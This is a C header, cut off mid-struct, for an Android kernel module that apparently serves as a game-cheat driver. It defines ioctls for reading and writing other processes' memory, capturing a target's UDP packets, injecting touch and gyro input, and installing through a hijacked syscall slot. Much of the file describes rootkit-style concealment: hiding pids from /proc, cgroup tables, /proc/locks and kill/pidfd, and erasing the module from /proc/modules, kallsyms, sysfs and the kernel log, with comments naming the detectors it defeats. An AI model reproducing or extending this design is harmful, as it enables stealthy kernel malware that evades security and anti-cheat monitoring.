/* SPDX-License-Identifier: GPL-2.0-only */
#ifndef NBDRIVER_ABI_H
#define NBDRIVER_ABI_H

#ifdef __KERNEL__
#include <linux/types.h>
#include <linux/ioctl.h>
typedef __u16 nbdriver_u16;
typedef __u32 nbdriver_u32;
typedef __s32 nbdriver_s32;
typedef __u64 nbdriver_u64;
typedef __s64 nbdriver_s64;
#else
#include <stdint.h>
#include <sys/ioctl.h>
typedef uint16_t nbdriver_u16;
typedef uint32_t nbdriver_u32;
typedef int32_t nbdriver_s32;
typedef uint64_t nbdriver_u64;
typedef int64_t nbdriver_s64;
#endif

#define NBDRIVER_ABI_VERSION 5U
#define NBDRIVER_INSTALL_MAGIC1 0x44464D50U /* DFMP */
#define NBDRIVER_INSTALL_MAGIC2 0x504D4644U /* PMFD */
#define NBDRIVER_INSTALL_SYSCALL 18U /* 首选候选；实际安装槽位动态选择，不是固定 18 探针 */
#define NBDRIVER_INSTALL_REBOOT_SYSCALL 142U /* Android ARM64 */
#define NBDRIVER_INSTALL_CANDIDATE_COUNT 150U

/* Keep kernel slot selection and the standalone SDK's bounded scan identical. */
static inline unsigned int nbdriver_install_candidate(unsigned int index)
{
    static const unsigned int preferred[] = { 18U, 38U, 42U, 163U, 164U };
    if (index < 5U)
        return preferred[index];
    if (index < 21U)
        return 244U + index - 5U;
    if (index < NBDRIVER_INSTALL_CANDIDATE_COUNT)
        return 295U + index - 21U;
    return ~0U;
}
/* 输出未回写的哨兵；其他负值为驱动 -errno，FD 0 也合法。
 * 引导 syscall 的直接返回值不作为 FD；SDK 还需完成 GET_ABI 校验。 */
#define NBDRIVER_INSTALL_PENDING (-2147483647 - 1)

#define NBDRIVER_FEATURE_READ_PROCESS  (1U << 0)
#define NBDRIVER_FEATURE_WRITE_PROCESS (1U << 1)
#define NBDRIVER_FEATURE_READ_FAULT_IN (1U << 2)
#define NBDRIVER_FEATURE_FIND_PROCESS (1U << 3)
#define NBDRIVER_FEATURE_MODULE_BASE  (1U << 4)
#define NBDRIVER_FEATURE_PROCESS_ID   (1U << 5)
#define NBDRIVER_FEATURE_THREAD_ID    (1U << 6)
#define NBDRIVER_FEATURE_THREAD_ENV   (1U << 7)
#define NBDRIVER_FEATURE_THREAD_FP    (1U << 8)
#define NBDRIVER_FEATURE_READV        (1U << 9)
#define NBDRIVER_FEATURE_MAPS         (1U << 10)
#define NBDRIVER_FEATURE_MAPPING      (1U << 11)
#define NBDRIVER_FEATURE_FD_SIZE      (1U << 12)
#define NBDRIVER_FEATURE_GPU_INFO     (1U << 13)
#define NBDRIVER_FEATURE_RANDOM       (1U << 14)
#define NBDRIVER_FEATURE_DEVPTS       (1U << 15)
#define NBDRIVER_FEATURE_THREAD_SIGNAL (1U << 16)
#define NBDRIVER_FEATURE_VMA           (1U << 17)
#define NBDRIVER_FEATURE_GPU_SYNC       (1U << 18)
#define NBDRIVER_FEATURE_GPU_VISIBILITY (1U << 19)
#define NBDRIVER_FEATURE_PROC_VISIBILITY (1U << 20)
#define NBDRIVER_FEATURE_RUNTIME_STATUS (1U << 21)
#define NBDRIVER_FEATURE_SF_GROUPS      (1U << 22)
#define NBDRIVER_FEATURE_TOUCH_CAPTURE (1U << 23)
#define NBDRIVER_FEATURE_TOUCH_VIRTUAL (1U << 24)
#define NBDRIVER_FEATURE_TOUCH          (1U << 31)
#define NBDRIVER_READ_MAX (64U * 1024U)
#define NBDRIVER_WRITE_MAX (64U * 1024U)

struct nbdriver_read_request {
	nbdriver_s32 pid;
	nbdriver_u32 size;
	nbdriver_u64 address;
	nbdriver_u64 buffer;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 failed_address;
	nbdriver_u32 copied;
	nbdriver_s32 error;
};

struct nbdriver_write_request {
	nbdriver_s32 pid;
	nbdriver_u32 size;
	nbdriver_u64 address;
	nbdriver_u64 buffer;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 failed_address;
	nbdriver_u32 copied;
	nbdriver_s32 error;
};

struct nbdriver_abi_info {
	nbdriver_u32 version;
	nbdriver_u32 size;
	nbdriver_u32 features;
	nbdriver_u32 reserved;
};

/* ABI 5 的运行状态及控制扩展：STATUS 只读，CONTROL 处理 QUIESCE/RESUME。
 * handle/generation 可能随模块重载重新计数；控制需匹配当前 handle/token。
 * 状态 flags 与实际 probe_mask 分开检查，不代表所有可选后端均可用。 */
#define NBDRIVER_RUNTIME_READY    (1U << 0)
#define NBDRIVER_RUNTIME_RESIDENT (1U << 1)
#define NBDRIVER_RUNTIME_PROBES  (1U << 2)
#define NBDRIVER_RUNTIME_QUIESCED (1U << 3)
#define NBDRIVER_RUNTIME_CONTROL_QUIESCE 1U
#define NBDRIVER_RUNTIME_CONTROL_RESUME  2U

struct nbdriver_runtime_status {
	nbdriver_u32 version;
	nbdriver_u32 size;
	nbdriver_u32 flags;
	nbdriver_s32 error;
	nbdriver_u64 handle;
	nbdriver_u64 token_lo;
	nbdriver_u64 token_hi;
	nbdriver_u64 generation;
	nbdriver_u32 probe_mask;
	nbdriver_u32 reserved;
};

struct nbdriver_runtime_control {
	nbdriver_u32 version;
	nbdriver_u32 size;
	nbdriver_u32 command;
	nbdriver_u32 reserved;
	nbdriver_u64 handle;
	nbdriver_u64 token_lo;
	nbdriver_u64 token_hi;
	nbdriver_s32 error;
	nbdriver_u32 reserved2;
};

#define NBDRIVER_IOC_MAGIC 'N'

#define NBDRIVER_IOC_GET_ABI \
	_IOR(NBDRIVER_IOC_MAGIC, 0x00, struct nbdriver_abi_info)
#define NBDRIVER_IOC_READ_PROCESS \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x01, struct nbdriver_read_request)
#define NBDRIVER_IOC_WRITE_PROCESS \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x02, struct nbdriver_write_request)
#define NBDRIVER_IOC_RUNTIME_STATUS \
	_IOR(NBDRIVER_IOC_MAGIC, 0x22, struct nbdriver_runtime_status)
#define NBDRIVER_IOC_RUNTIME_CONTROL \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x23, struct nbdriver_runtime_control)

/* Kernel-collected touchscreen snapshot. The kernel kprobe observes input_event
 * and publishes a coherent frame; userspace never opens /dev/input/event*. */
#define NBDRIVER_TOUCH_ABI_VERSION 1U
#define NBDRIVER_TOUCH_MAX_CONTACTS 10U
#define NBDRIVER_TOUCH_F_VALID       (1U << 0)
#define NBDRIVER_TOUCH_F_MT          (1U << 1)
#define NBDRIVER_TOUCH_F_SYN_DROPPED (1U << 2)
#define NBDRIVER_TOUCH_F_ROUTED      (1U << 3)
#define NBDRIVER_TOUCH_CONTACT_DOWN  (1U << 0)
#define NBDRIVER_TOUCH_CONTACT_UI    (1U << 1)
#define NBDRIVER_TOUCH_VIRTUAL_ABI_VERSION 1U
#define NBDRIVER_TOUCH_VIRTUAL_INIT    1U
#define NBDRIVER_TOUCH_VIRTUAL_DOWN    2U
#define NBDRIVER_TOUCH_VIRTUAL_MOVE    3U
#define NBDRIVER_TOUCH_VIRTUAL_UP      4U
#define NBDRIVER_TOUCH_VIRTUAL_DESTROY 5U

struct nbdriver_touch_contact {
	nbdriver_s32 tracking_id;
	nbdriver_s32 x;
	nbdriver_s32 y;
	nbdriver_s32 pressure;
	nbdriver_u32 flags;
	nbdriver_u32 reserved;
};

struct nbdriver_touch_snapshot {
	nbdriver_u32 version;
	nbdriver_u32 size;
	nbdriver_u32 flags;
	nbdriver_u32 count;
	nbdriver_s32 x_min;
	nbdriver_s32 x_max;
	nbdriver_s32 y_min;
	nbdriver_s32 y_max;
	nbdriver_u64 sequence;
	nbdriver_u64 timestamp_ns;
	struct nbdriver_touch_contact contacts[NBDRIVER_TOUCH_MAX_CONTACTS];
};

/* Reuses the existing touchscreen input_dev; no input node is created. */
struct nbdriver_touch_virtual_request {
	nbdriver_u32 version;
	nbdriver_u32 size;
	nbdriver_u32 operation;
	nbdriver_u32 slot;
	nbdriver_s32 x;
	nbdriver_s32 y;
	nbdriver_u32 virtual_slots;
	nbdriver_u32 screen_width;
	nbdriver_u32 screen_height;
	nbdriver_s32 x_min;
	nbdriver_s32 x_max;
	nbdriver_s32 y_min;
	nbdriver_s32 y_max;
	nbdriver_u32 active;
	nbdriver_s32 error;
	nbdriver_u32 reserved[2];
};

#define NBDRIVER_IOC_TOUCH_VIRTUAL \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x2a, struct nbdriver_touch_virtual_request)

#define NBDRIVER_IOC_TOUCH_READ \
	_IOR(NBDRIVER_IOC_MAGIC, 0x29, struct nbdriver_touch_snapshot)

/* Private overlay capture; rectangles use raw panel coordinates. */
#define NBDRIVER_TOUCH_CAPTURE_ABI_VERSION 1U
#define NBDRIVER_TOUCH_CAPTURE_RECTS 16U
struct nbdriver_touch_capture_rect {
    nbdriver_s32 left, top, right, bottom;
    nbdriver_s32 radius_x, radius_y;
};
struct nbdriver_touch_capture_request {
    nbdriver_u32 version, size, enabled, count;
    struct nbdriver_touch_capture_rect rects[NBDRIVER_TOUCH_CAPTURE_RECTS];
    nbdriver_u32 active;
    nbdriver_s32 error;
};
#define NBDRIVER_IOC_TOUCH_CAPTURE \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x2b, struct nbdriver_touch_capture_request)

/* Add the fixed Android groups required by the injected SurfaceFlinger
 * worker. The kernel validates the caller as the real SF process and only
 * mutates the calling thread's supplementary groups. */
#define NBDRIVER_SF_GROUPS_ABI_VERSION 1U
#define NBDRIVER_SF_GROUP_INPUT        (1U << 0)
#define NBDRIVER_SF_GROUP_INET         (1U << 1)
#define NBDRIVER_SF_GROUP_REQUIRED     (NBDRIVER_SF_GROUP_INPUT | NBDRIVER_SF_GROUP_INET)

struct nbdriver_sf_groups_request {
	nbdriver_u32 abi_version;
	nbdriver_u32 reserved;
	nbdriver_u32 out_present;
	nbdriver_u32 out_added;
	nbdriver_u32 out_group_count;
	nbdriver_u32 out_reserved[3];
};

#define NBDRIVER_IOC_SF_GROUPS_ACQUIRE \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x24, struct nbdriver_sf_groups_request)


/* Fixed configuration proxy. No caller paths or permanent credential changes.
 * QUERY is the capability probe (the legacy 32 feature bits are exhausted).
 * READ returns the complete file or fails E2BIG; WRITE atomically replaces it.
 * DELETE is idempotent. All data is bounded to 64 KiB. Old modules: ENOTTY.
 * stage identifies failure without exposing paths or configuration contents. */
#define NBDRIVER_CONFIG_ABI_VERSION 1U
#define NBDRIVER_CONFIG_MAX 65536U
#define NBDRIVER_CONFIG_QUERY 0U
#define NBDRIVER_CONFIG_READ 1U
#define NBDRIVER_CONFIG_WRITE 2U
#define NBDRIVER_CONFIG_DELETE 3U
#define NBDRIVER_CONFIG_DFM 1U
#define NBDRIVER_CONFIG_RUST 2U
#define NBDRIVER_CONFIG_STAGE_VALIDATE 1U
#define NBDRIVER_CONFIG_STAGE_IDENTITY 2U
#define NBDRIVER_CONFIG_STAGE_DIRECTORY 3U
#define NBDRIVER_CONFIG_STAGE_OPEN 4U
#define NBDRIVER_CONFIG_STAGE_TRANSFER 5U
#define NBDRIVER_CONFIG_STAGE_FILE_SYNC 6U
#define NBDRIVER_CONFIG_STAGE_PUBLISH 7U
#define NBDRIVER_CONFIG_STAGE_DIRECTORY_SYNC 8U
#define NBDRIVER_CONFIG_STAGE_COPY 9U
struct nbdriver_config_request {
    nbdriver_u32 version;
    nbdriver_u32 operation;
    nbdriver_u32 config;
    nbdriver_u32 size;
    nbdriver_u64 buffer;
    nbdriver_u32 transferred;
    nbdriver_u32 stage;
    nbdriver_u64 reserved;
};
#define NBDRIVER_IOC_CONFIG \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x30, struct nbdriver_config_request)

/* Additive ABI 5 extensions; existing request layouts and ioctl numbers stay fixed. */
#define NBDRIVER_QUERY_NAME_MAX 256U
#define NBDRIVER_THREAD_NAME_MAX 16U
#define NBDRIVER_READV_MAX 1024U
#define NBDRIVER_READV_ITEM_MAX (512U * 1024U)
#define NBDRIVER_READV_TOTAL_MAX (16U * 1024U * 1024U)
#define NBDRIVER_THREAD_TLS_VALID (1U << 0)
#define NBDRIVER_THREAD_APGA_VALID (1U << 1)
#define NBDRIVER_THREAD_FP_VALID 1U

struct nbdriver_pid_request {
	char name[NBDRIVER_QUERY_NAME_MAX];
	nbdriver_s32 pid;
	nbdriver_u32 reserved;
	nbdriver_u64 start_ns;
};

struct nbdriver_module_request {
	nbdriver_s32 pid;
	nbdriver_u32 reserved;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 base;
	char name[NBDRIVER_QUERY_NAME_MAX];
};

struct nbdriver_process_identity {
	nbdriver_s32 pid;
	nbdriver_u32 reserved;
	nbdriver_u64 start_ns;
};

struct nbdriver_thread_request {
	nbdriver_s32 pid;
	nbdriver_s32 tid;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 thread_start_ns;
	char comm[NBDRIVER_THREAD_NAME_MAX];
};

struct nbdriver_thread_environment {
	nbdriver_s32 pid;
	nbdriver_s32 tid;
	nbdriver_u32 valid;
	nbdriver_u32 reserved;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 expected_thread_start_ns;
	nbdriver_u64 tls;
	nbdriver_u64 apga_lo;
	nbdriver_u64 apga_hi;
};

/* Read-only, coherent action + blocked mask snapshot under sighand->siglock.
 * ARM64 native signal ABI: 64 signals / one u64 sigset. No target mutation. */
struct nbdriver_thread_signal {
	nbdriver_s32 pid;
	nbdriver_s32 tid;
	nbdriver_u32 signo;
	nbdriver_u32 reserved;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 expected_thread_start_ns;
	nbdriver_u64 handler;
	nbdriver_u64 flags;
	nbdriver_u64 restorer;
	nbdriver_u64 action_mask;
	nbdriver_u64 blocked_mask;
	nbdriver_u64 sample_ns;
};

struct nbdriver_thread_fpstate {
	nbdriver_s32 pid;
	nbdriver_s32 tid;
	nbdriver_u32 valid;
	nbdriver_u32 reserved;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 expected_thread_start_ns;
	nbdriver_u64 tls;
	nbdriver_u64 sample_ns;
	nbdriver_u32 fpsr;
	nbdriver_u32 fpcr;
};

struct nbdriver_readv_entry {
	nbdriver_u64 address;
	nbdriver_u64 buffer;
	nbdriver_u32 size;
	nbdriver_u32 copied;
	nbdriver_s32 error;
	nbdriver_u32 reserved;
	nbdriver_u64 failed_address;
};

struct nbdriver_readv_request {
	nbdriver_s32 pid;
	nbdriver_u32 count;
	nbdriver_u64 entries;
	nbdriver_u64 expected_start_ns;
	nbdriver_u32 completed;
	nbdriver_s32 error;
};

#define NBDRIVER_IOC_FIND_PROCESS \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x10, struct nbdriver_pid_request)
#define NBDRIVER_IOC_MODULE_BASE \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x11, struct nbdriver_module_request)
#define NBDRIVER_IOC_PROCESS_ID \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x12, struct nbdriver_process_identity)
#define NBDRIVER_IOC_THREAD_ID \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x13, struct nbdriver_thread_request)
#define NBDRIVER_IOC_THREAD_ENV \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x14, struct nbdriver_thread_environment)
#define NBDRIVER_IOC_THREAD_SIGNAL \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x1d, struct nbdriver_thread_signal)
/* Same layout as MAPPING; physical/page_size remain zero, no page-table walk. */
#define NBDRIVER_IOC_VMA \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x1e, struct nbdriver_mapping_request)
#define NBDRIVER_IOC_THREAD_FP \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x15, struct nbdriver_thread_fpstate)
#define NBDRIVER_IOC_READV \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x16, struct nbdriver_readv_request)

#define NBDRIVER_MAPS_MAX (4U * 1024U * 1024U)
#define NBDRIVER_RANDOM_MAX 64U
#define NBDRIVER_MAPPING_READ   (1U << 0)
#define NBDRIVER_MAPPING_WRITE  (1U << 1)
#define NBDRIVER_MAPPING_EXEC   (1U << 2)
#define NBDRIVER_MAPPING_SHARED (1U << 3)

/* capacity includes the terminating NUL; length excludes it. A zero capacity
 * and zero buffer query the required length. ENOSPC copies no partial text. */
struct nbdriver_maps_request {
	nbdriver_s32 pid;
	nbdriver_u32 capacity;
	nbdriver_u64 buffer;
	nbdriver_u64 expected_start_ns;
	nbdriver_u32 length;
	nbdriver_u32 copied;
	nbdriver_s32 error;
	nbdriver_u32 reserved;
};

struct nbdriver_mapping_request {
	nbdriver_s32 pid;
	nbdriver_u32 reserved;
	nbdriver_u64 address;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 physical;
	nbdriver_u64 page_size;
	nbdriver_u64 vma_start;
	nbdriver_u64 vma_end;
	nbdriver_u32 flags;
	nbdriver_u32 reserved2;
};

/* Exact seek on a separate description of a regular target file. The target
 * file position is unchanged. Transport errors use error; syscall errno is
 * returned as a negative result. SEEK_CUR is deliberately unsupported. */
struct nbdriver_fd_seek_request {
 nbdriver_s32 pid, target_fd;
 nbdriver_u64 expected_start_ns;
 nbdriver_s64 offset, result;
 nbdriver_u32 whence;
 nbdriver_s32 error;
 nbdriver_u64 reserved;
};
#define NBDRIVER_IOC_FD_SEEK \
 _IOWR(NBDRIVER_IOC_MAGIC, 0x2c, struct nbdriver_fd_seek_request)

struct nbdriver_fd_size_request {
	nbdriver_s32 pid;
	nbdriver_s32 target_fd;
	nbdriver_u64 expected_start_ns;
	nbdriver_u64 size;
	nbdriver_s32 error;
	nbdriver_u32 reserved;
};

/* Read-only Mali GET_GPUPROPS on the existing target FD. The native
 * buffer/capacity/flags tuple is passed from this caller, never target memory.
 * Result preserves the GPU syscall value; error is transport/identity failure.
 * ABI 5 extension: older modules return ENOTTY. No KGSL capability required. */
#define NBDRIVER_GPU_PROPERTIES_MAX (64U * 1024U)
struct nbdriver_gpu_properties_request {
 nbdriver_s32 pid, target_fd;
 nbdriver_u64 expected_start_ns;
 nbdriver_u64 buffer;
 nbdriver_u32 capacity, flags;
 nbdriver_s64 result;
 nbdriver_u64 sample_ns;
 nbdriver_s32 error;
 nbdriver_u32 reserved;
};
#define NBDRIVER_IOC_GPU_PROPERTIES \
 _IOWR(NBDRIVER_IOC_MAGIC, 0x2e, struct nbdriver_gpu_properties_request)

/* Matches the 48-byte KGSL GPUOBJ_INFO payload; never expose kernel pointers. */
struct nbdriver_gpu_object_info {
	nbdriver_u64 gpu_address;
	nbdriver_u64 flags;
	nbdriver_u64 size;
	nbdriver_u64 virtual_length;
	nbdriver_u64 virtual_address;
	nbdriver_u32 id;
	nbdriver_u32 reserved;
};

struct nbdriver_gpu_info_request {
	nbdriver_s32 pid;
	nbdriver_s32 target_fd;
	nbdriver_u32 object_id;
	nbdriver_u32 reserved;
	nbdriver_u64 expected_start_ns;
	nbdriver_s64 result;
	nbdriver_u64 sample_ns;
	struct nbdriver_gpu_object_info info;
};

struct nbdriver_random_request {
	nbdriver_u64 buffer;
	nbdriver_u32 size;
	nbdriver_u32 copied;
	nbdriver_s32 error;
	nbdriver_u32 reserved;
};

#define NBDRIVER_IOC_MAPS \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x17, struct nbdriver_maps_request)
#define NBDRIVER_IOC_MAPPING \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x18, struct nbdriver_mapping_request)
#define NBDRIVER_IOC_FD_SIZE \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x19, struct nbdriver_fd_size_request)
#define NBDRIVER_IOC_GPU_INFO \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x1a, struct nbdriver_gpu_info_request)
#define NBDRIVER_IOC_RANDOM \
	_IOWR(NBDRIVER_IOC_MAGIC, 0x1b, struct nbdriver_random_request)

/* Automatic filtering is armed by module init; this ABI is read-only.
 * pids[0] = DFM, pids[1] = RMCN, in the caller PID namespace.
 * target_count includes all instances; a PID slot represents one instance.
 * Command 0x1c is retired and must not be reused. */
#define NBDRIVER_DEVPTS_PACKAGE_COUNT 2U
#define NBDRIVER_DEVPTS_MAX_INDEX 31U
struct nbdriver_devpts_status {
	nbdriver_u32 size;
	nbdriver_u32 active;
	nbdriver_u32 max_index;
	nbdriver_u32 target_count;
	nbdriver_s32 pids[NBDRIVER_DEVPTS_PACKAGE_COUNT];
	nbdriver_u64 permission_hits;
	nbdriver_u64 getattr_hits;
	nbdriver_u64 generation;
	nbdriver_s32 last_error;
	nbdriver_u32 reserved;
};
#define NBDRIVER_IOC_DEVPTS_STATUS \
	_IOR(NBDRIVER_IOC_MAGIC, 0x1f, struct nbdriver_devpts_status)


#define NBDRIVER_GPU_SYNC_MAX_ID 4096U
#define NBDRIVER_GPU_SYNC_WORDS (NBDRIVER_GPU_SYNC_MAX_ID / 64U)
#define NBDRIVER_GPU_BACKEND_IDR_LOCKED 1U
#define NBDRIVER_GPU_STAGE_NONE 0U
#define NBDRIVER_GPU_STAGE_IDENTITY 1U
#define NBDRIVER_GPU_STAGE_LAYOUT 2U
#define NBDRIVER_GPU_STAGE_PROCESS 3U
#define NBDRIVER_GPU_STAGE_IDR 4U
struct nbdriver_gpu_sync_request {
    nbdriver_s32 pid;
    nbdriver_s32 target_fd;
    nbdriver_u64 expected_start_ns;
    nbdriver_u32 max_id;
    nbdriver_u32 reserved;
    nbdriver_u32 first_free;
    nbdriver_u32 occupied_count;
    nbdriver_u32 backend;
    nbdriver_u32 fail_stage;
    nbdriver_s32 error;
    nbdriver_u32 reserved2;
    nbdriver_u64 sample_ns;
    nbdriver_u64 occupied[NBDRIVER_GPU_SYNC_WORDS];
};
#define NBDRIVER_GPU_VISIBILITY_QUERY 0U
#define NBDRIVER_GPU_VISIBILITY_HIDE 1U
#define NBDRIVER_GPU_VISIBILITY_SHOW 2U
#define NBDRIVER_GPU_VISIBILITY_MAX_TARGETS 64U
struct nbdriver_gpu_visibility_request {
    nbdriver_s32 pid;
    nbdriver_u32 operation;
    nbdriver_u64 expected_start_ns;
    nbdriver_u32 hidden;
    nbdriver_u32 active;
    nbdriver_u32 target_count;
    nbdriver_s32 error;
    nbdriver_u64 directory_hits;
    nbdriver_u64 access_hits;
    nbdriver_u64 missed;
};
#define NBDRIVER_IOC_GPU_SYNC \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x20, struct nbdriver_gpu_sync_request)
#define NBDRIVER_IOC_GPU_VISIBILITY \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x21, struct nbdriver_gpu_visibility_request)

/* Downlink capture, additive ABI 5. Payloads stay encrypted/raw. IPv4
 * addresses are network order; ports and other integers are host order.
 * UID matching includes every socket with the target's real UID; it is not
 * proof that a socket belongs exclusively to one PID. */
#define NBDRIVER_FEATURE_UDP_CAPTURE (1U << 23)
#define NBDRIVER_UDP_MAX_PAYLOAD 2048U
#define NBDRIVER_UDP_RING_SIZE 256U
#define NBDRIVER_UDP_READ_MAX 32U
#define NBDRIVER_UDP_F_TRUNCATED (1U << 0)
#define NBDRIVER_UDP_F_GRO (1U << 1)

struct nbdriver_udp_packet {
    nbdriver_u64 sequence;
    nbdriver_u64 timestamp_ns;
    nbdriver_u32 src_ip;
    nbdriver_u32 dst_ip;
    nbdriver_u32 socket_uid;
    nbdriver_u32 original_len;
    nbdriver_u16 src_port;
    nbdriver_u16 dst_port;
    nbdriver_u16 payload_len;
    nbdriver_u16 flags;
    nbdriver_u16 gso_size;
    nbdriver_u16 reserved;
    nbdriver_u32 reserved2;
    unsigned char payload[NBDRIVER_UDP_MAX_PAYLOAD];
};

struct nbdriver_udp_start_request {
    nbdriver_s32 pid;
    nbdriver_u32 reserved;
    nbdriver_u64 expected_start_ns;
    nbdriver_u32 min_payload; /* zero selects 16 */
    nbdriver_u32 max_payload; /* zero selects MAX_PAYLOAD; larger packets truncate */
    nbdriver_u64 generation;  /* input zero; output fresh session identity */
};

struct nbdriver_udp_status {
    nbdriver_u32 size;
    nbdriver_u32 active;
    nbdriver_s32 pid;
    nbdriver_u32 uid;
    nbdriver_u64 start_ns;
    nbdriver_u64 generation;
    nbdriver_u64 captured;
    nbdriver_u64 overflow;   /* ring overwrote oldest queued record */
    nbdriver_u64 truncated;
    nbdriver_u64 malformed;
    nbdriver_u64 probe_missed;
    nbdriver_u64 sample_ns;
    nbdriver_u32 queued;    /* ring plus detached records awaiting successful read */
    nbdriver_u32 min_payload;
    nbdriver_u32 max_payload;
    nbdriver_s32 error;
};

struct nbdriver_udp_read_request {
    nbdriver_u64 packets;
    nbdriver_u64 generation; /* must match START; never merges sessions */
    nbdriver_u32 capacity;
    nbdriver_u32 count;
    struct nbdriver_udp_status status;
};

#define NBDRIVER_IOC_UDP_START \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x25, struct nbdriver_udp_start_request)
#define NBDRIVER_IOC_UDP_READ \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x26, struct nbdriver_udp_read_request)
#define NBDRIVER_IOC_UDP_STOP _IO(NBDRIVER_IOC_MAGIC, 0x27)
#define NBDRIVER_IOC_UDP_STATUS \
    _IOR(NBDRIVER_IOC_MAGIC, 0x28, struct nbdriver_udp_status)

/* Kernel-side complement to PROC_VISIBILITY. Hiding the /proc entry alone
 * leaves the pid named in tables that are not proc_root children and that any
 * unprivileged process can read:
 *
 *   /sys/fs/cgroup/cgroup.procs    (0755)
 *   /sys/fs/cgroup/cgroup.threads  (0755)
 *   /proc/locks                    (0444)
 *
 * "Listed in a table but absent from /proc" is a computable fingerprint, so
 * those rows are suppressed as well. No userspace call is needed: the feature
 * follows the same target table PROC_VISIBILITY uses and is reported through
 * the existing feature mask. Nothing is relocated, so no private cgroup
 * directory is created for a detector to enumerate. */
#define NBDRIVER_FEATURE_PID_TABLE_VISIBILITY (1U << 25)

/* Suppresses this module's own name in /proc/modules. Without it, any app can
 * read "nbdriver <size> <refs> Live (OE)" and learn that a third-party driver
 * is loaded, no matter how well individual pids are hidden. */
#define NBDRIVER_FEATURE_MODULE_TRACE_VISIBILITY (1U << 26)

/* Drops this module's own symbol rows from /proc/kallsyms. Addresses are
 * already zeroed by kptr_restrict=2, but names and the [module] tag stay
 * visible, which is enough to identify the driver's purpose. */
#define NBDRIVER_FEATURE_KALLSYMS_VISIBILITY (1U << 27)

/* Drops /sys/module/nbdriver from the sysfs listing. The directory itself
 * stays functional for root tooling; only the readdir entry is suppressed. */
#define NBDRIVER_FEATURE_SYSFS_MODULE_VISIBILITY (1U << 28)

/* Makes pidfd_open(2) and kill/tkill/tgkill report ESRCH for hidden pids. Both
 * resolve the pid through the kernel pid hash rather than procfs, so they would
 * otherwise still confirm that a hidden process exists. */
#define NBDRIVER_FEATURE_PIDFD_VISIBILITY (1U << 29)

/* Drops this module's own pr_* records at vprintk_store(), so its name never
 * enters the printk ring buffer. Selectively narrow: unlike dmesg_restrict it
 * leaves the kernel log readable for every other consumer. */
#define NBDRIVER_FEATURE_PRINTK_VISIBILITY (1U << 30)


/* Optional gyro extension: discover with STATUS (ENOTTY on older modules).
 * ABI 5's 32 feature bits are already occupied; no existing bit is reused.
 * Rates are finite IEEE-754 binary32 bits in rad/s, at most +/-1.
 * The active lease belongs to this anonymous FD and exact process lifetime.
 */
#define NBDRIVER_GYRO_ABI_VERSION 1U
#define NBDRIVER_GYRO_TYPE_CALIBRATED 1U
#define NBDRIVER_GYRO_TYPE_UNCALIBRATED 2U
#define NBDRIVER_GYRO_STATUS 0U
#define NBDRIVER_GYRO_SET 1U
#define NBDRIVER_GYRO_STOP 2U
#define NBDRIVER_GYRO_AVAILABLE (1U << 0)
#define NBDRIVER_GYRO_ACTIVE (1U << 1)
#define NBDRIVER_GYRO_MAX_LEASE_MS 250U
struct nbdriver_gyro_request {
    nbdriver_u32 version, size, operation, flags;
    nbdriver_s32 pid;
    nbdriver_u32 lease_ms;
    nbdriver_u64 expected_start_ns;
    nbdriver_u32 type_mask, delta_x_bits, delta_y_bits, reserved;
    nbdriver_u64 modified_events, copy_failures, missed;
    nbdriver_u32 channels;
    nbdriver_s32 error;
};
#define NBDRIVER_IOC_GYRO \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x2d, struct nbdriver_gyro_request)

/* Raw ARM64 debug-register capture, optional additive ABI 5 extension.
 * INFO discovers availability; no feature bit is reused. X=4, R=1, W=2,
 * RW=3 match the old NBG-driver's raw API. Each arm captures once and disarms
 * before returning to the SAME PC, so the original instruction executes.
 * REARM explicitly requests another capture; this is not an every-hit trace.
 * tid=0 selects the process's thread group; otherwise bind an exact thread.
 * No target instructions, registers or memory are modified by the capture.
 */
#define NBDRIVER_HWBP_ABI_VERSION 1U
#define NBDRIVER_HWBP_INFO 0U
#define NBDRIVER_HWBP_ADD 1U
#define NBDRIVER_HWBP_REMOVE 2U
#define NBDRIVER_HWBP_READ 3U
#define NBDRIVER_HWBP_CLEAR 4U
#define NBDRIVER_HWBP_REARM 5U
#define NBDRIVER_HWBP_R 1U
#define NBDRIVER_HWBP_W 2U
#define NBDRIVER_HWBP_RW 3U
#define NBDRIVER_HWBP_X 4U
#define NBDRIVER_HWBP_AVAILABLE (1U << 0)
#define NBDRIVER_HWBP_ARMED (1U << 1)
#define NBDRIVER_HWBP_TARGET_GONE (1U << 2)
#define NBDRIVER_HWBP_RAW_REGISTERS (1U << 3)
#define NBDRIVER_HWBP_RECORD_IMPRECISE (1U << 0)
#define NBDRIVER_HWBP_RECORD_KERNEL_ACCESS (1U << 1)
#define NBDRIVER_HWBP_RECORDS 64U
struct nbdriver_hwbp_record {
    nbdriver_u64 sequence, timestamp_ns, handle, address;
    nbdriver_s32 pid, tid;
    nbdriver_u32 type, flags;
